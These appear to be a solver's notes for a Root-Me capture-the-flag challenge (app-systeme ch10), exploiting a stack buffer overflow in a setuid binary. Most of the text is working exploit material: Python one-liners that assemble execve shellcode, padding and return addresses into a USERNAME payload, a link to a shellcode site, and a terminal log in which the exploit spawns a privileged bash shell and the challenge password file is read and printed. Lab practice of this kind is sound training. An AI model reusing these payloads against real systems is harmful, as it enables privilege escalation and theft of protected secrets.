# Local Payload

python -c 'print "USERNAME=" + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "A" * (136-21) + "\xa0\xd1\x04\x08" + "C" * 28 + "\xe9\xd2\x04\x08"' > x4


- scp r.sh to root-me/tmp/r.sh and use that for differencing addresses.
- QUESTION: While in different directories, why does the *fp point to a different location 
			in the "A" buff AFTER it's finished with fopen()?

		- SUCCESS: user location in /tmp while executing /challenge/app-systeme/ch10/./ch10
		- FAIL: user location in /challenge/app-systeme/ch10/ and executes there.
		- WHY?

# GDB Remote

+ http://shell-storm.org/shellcode/files/shellcode-606.php
+ referenced shellcode allows for elevated privs. (/bin/bash)
- (/bin/dash) + (/bin/sh) shellcode failed.
* try 'python import pty;pty.spawn("/bin/bash")'

app-systeme-ch10@challenge02:~$ python -c 'print "USERNAME=" + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "A" * (136-33) + "\x60\xb1\x04\x08" + "C" * 28 + "\xc9\xb2\x04\x08"' > /tmp/x

app-systeme-ch10@challenge02:~$ python -c 'print "USERNAME=" + "\x31\xc0\x50\x68\x64\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * (136-30) + "\x60\xb1\x04\x08" + "C" * 28 + "\xc9\xb2\x04\x08"' > /tmp/x


# FLAG
app-systeme-ch10@challenge02:/tmp$ python -c 'print "USERNAME=" + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "A" * (136-33) + "\x60\xb1\x04\x08" + "C" * 28 + "\xc9\xb2\x04\x08"' > /tmp/x
app-systeme-ch10@challenge02:/tmp$ /challenge/app-systeme/ch10/./ch10 /tmp/x
bash-4.4$ id
uid=1110(app-systeme-ch10) gid=1110(app-systeme-ch10) euid=1210(app-systeme-ch10-cracked) groups=1110(app-systeme-ch10),100(users)
bash-4.4$ cat /challenge/app-systeme/ch10/.passwd
h8Q!2)3=9"51
bash-4.4$


